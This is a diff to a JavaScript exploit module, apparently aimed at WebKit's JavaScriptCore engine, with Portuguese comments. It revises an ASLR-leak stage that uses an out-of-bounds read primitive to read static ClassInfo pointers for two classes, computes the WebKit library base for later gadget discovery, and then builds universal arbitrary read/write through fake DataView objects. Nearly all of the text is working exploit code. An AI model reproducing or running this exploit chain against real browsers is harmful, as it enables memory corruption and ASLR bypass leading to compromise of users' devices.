@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v138 - Foco na Depuração do Vazamento ASLR)
+// js/script3/testArrayBufferVictimCrash.mjs (v139 - Foco na Depuração do Vazamento ASLR - Teste DebuggerScope::s_info)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -24,7 +24,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v138_ASLR_DEBUG_FOCUS";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v139_ASLR_DEBUG_DEBUGGERSCOPE";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -54,8 +54,6 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    // Importante: garantir que arbReadFn aqui seja a primitiva OOB de baixo nível
-                    // para depurar a acessibilidade da memória.
                     const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
@@ -79,9 +77,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
 
 
 // As primitivas universais serão testadas APENAS depois que o vazamento de ASLR for bem-sucedido.
-// Removemos a lógica de tentativa e erro de m_mode daqui para focar na depuração do ASLR.
-// As funções arb_read_universal_js_heap e arb_write_universal_js_heap permanecem,
-// mas serão chamadas apenas se o vazamento de ASLR e a configuração do fake DataView forem bem-sucedidas.
+// Removida a lógica de tentativa e erro de m_mode daqui, pois a prioridade é o ASLR.
 
 export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const FNAME = "arb_read_universal_js_heap";
@@ -261,37 +257,51 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB) ---", "subtest");
         const leakPrepStartTime = performance.now();
 
-        logFn(`[REAL LEAK] Tentando vazar ASLR lendo o endereço de JSC::JSArrayBufferView::s_info (ClassInfo estática) via OOB.`, "info");
+        let leak_attempts = [
+            { name: "JSC::JSArrayBufferView::s_info", offset_key: "JSC::JSArrayBufferView::s_info" },
+            { name: "JSC::DebuggerScope::s_info", offset_key: "JSC::DebuggerScope::s_info" }
+        ];
 
-        const S_INFO_STATIC_OFFSET = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
-        const TARGET_CLASSINFO_ADDRESS = S_INFO_STATIC_OFFSET;
+        let leaked_successfully = false;
 
-        let class_info_ptr_raw;
-        try {
-            logFn(`[REAL LEAK] Tentando ler 8 bytes de ${TARGET_CLASSINFO_ADDRESS.toString(true)} (JSC::JSArrayBufferView::s_info).`, "info");
-            class_info_ptr_raw = await arb_read(TARGET_CLASSINFO_ADDRESS, 8);
+        for (const attempt of leak_attempts) {
+            logFn(`[REAL LEAK] Tentando vazar ASLR lendo o endereço de ${attempt.name} (ClassInfo estática) via OOB.`, "info");
 
-            if (!isAdvancedInt64Object(class_info_ptr_raw) || class_info_ptr_raw.equals(AdvancedInt64.Zero) || class_info_ptr_raw.equals(AdvancedInt64.NaNValue)) {
-                 throw new Error(`Leitura de ClassInfo estática (${TARGET_CLASSINFO_ADDRESS.toString(true)}) via OOB retornou valor inválido: ${class_info_ptr_raw?.toString(true) || String(class_info_ptr_raw)}.`);
+            const S_INFO_OFFSET = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS[attempt.offset_key], 16), 0);
+            const TARGET_ADDRESS = S_INFO_OFFSET;
+
+            let class_info_ptr_raw;
+            try {
+                logFn(`[REAL LEAK] Tentando ler 8 bytes de ${TARGET_ADDRESS.toString(true)} (${attempt.name}).`, "info");
+                class_info_ptr_raw = await arb_read(TARGET_ADDRESS, 8);
+
+                if (!isAdvancedInt64Object(class_info_ptr_raw) || class_info_ptr_raw.equals(AdvancedInt64.Zero) || class_info_ptr_raw.equals(AdvancedInt64.NaNValue)) {
+                     throw new Error(`Leitura de ClassInfo estática (${TARGET_ADDRESS.toString(true)}) via OOB retornou valor inválido: ${class_info_ptr_raw?.toString(true) || String(class_info_ptr_raw)}.`);
+                }
+                logFn(`[REAL LEAK] Valor lido no offset de ${attempt.name}: ${class_info_ptr_raw.toString(true)}`, "leak");
+
+                webkit_base_address = class_info_ptr_raw.sub(TARGET_ADDRESS);
+
+                if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+                    throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR falhou para ${attempt.name}.`);
+                }
+                logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ${attempt.name}: ${webkit_base_address.toString(true)}`, "good");
+                leaked_successfully = true;
+                break; // Sai do loop de tentativas se uma for bem-sucedida
+
+            } catch (e_leak) {
+                logFn(`[REAL LEAK] ALERTA: Vazamento de ${attempt.name} via OOB original falhou: ${e_leak.message}.`, "warn");
+                logFn(`[REAL LEAK] Realizando dump de memória ao redor do offset ${TARGET_ADDRESS.toString(true)} para depuração...`, "info");
+                await dumpMemory(TARGET_ADDRESS.sub(0x20), 0x80, logFn, arb_read, `${attempt.name}_Surrounding_Dump`);
             }
-            logFn(`[REAL LEAK] Valor lido no offset de JSC::JSArrayBufferView::s_info: ${class_info_ptr_raw.toString(true)}`, "leak");
-
-            webkit_base_address = class_info_ptr_raw.sub(TARGET_CLASSINFO_ADDRESS);
-
-            if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR falhou.`);
-            }
-            logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ClassInfo estática: ${webkit_base_address.toString(true)}`, "good");
-
-        } catch (e_leak) {
-            logFn(`[REAL LEAK] ALERTA: Vazamento de ClassInfo estática via OOB original falhou: ${e_leak.message}.`, "warn");
-            logFn(`[REAL LEAK] Realizando dump de memória ao redor do offset ${TARGET_CLASSINFO_ADDRESS.toString(true)} para depuração...`, "info");
-            await dumpMemory(TARGET_CLASSINFO_ADDRESS.sub(0x20), 0x80, logFn, arb_read, "ClassInfo_s_info_Surrounding_Dump");
-            logFn(`[REAL LEAK] Tempo da Fase de Vazamento: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "warn");
-            logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou. Não é possível prosseguir para as fases dependentes de ASLR sem o endereço base real.`, "critical");
-            // **PONTO DE ABORTO**: Se o vazamento de ASLR falhar, o exploit para aqui.
-            throw new Error("Vazamento de ASLR falhou, abortando exploração.");
         }
+
+        if (!leaked_successfully) {
+            logFn(`[REAL LEAK] Tempo da Fase de Vazamento: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "warn");
+            logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou para TODAS as alternativas. Não é possível prosseguir para as fases dependentes de ASLR.`, "critical");
+            throw new Error("Vazamento de ASLR falhou para todas as alternativas, abortando exploração.");
+        }
+
 
         logFn(`PREPARED: WebKit base address for gadget discovery. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
@@ -309,9 +319,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         let universalRwSuccess = false;
         let found_m_mode = null;
 
+        // Note: _fake_data_view e _fake_array_buffer são redefinidos dentro de attemptUniversalArbitraryReadWriteWithMMode
         for (const candidate_m_mode of mModeCandidates) {
             logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
-            // `_fake_data_view` e `_fake_array_buffer` são resetados dentro de attemptUniversalArbitraryReadWriteWithMMode
             universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                 logFn,
                 pauseFn,
@@ -338,8 +348,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-        // Se chegamos até aqui, o ARB R/W universal está funcionando.
-        // Podemos então usar dumpMemory com a nova primitiva:
         const dumpTargetUint8Array = new Uint8Array(0x100);
         hold_objects.push(dumpTargetUint8Array);
         const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
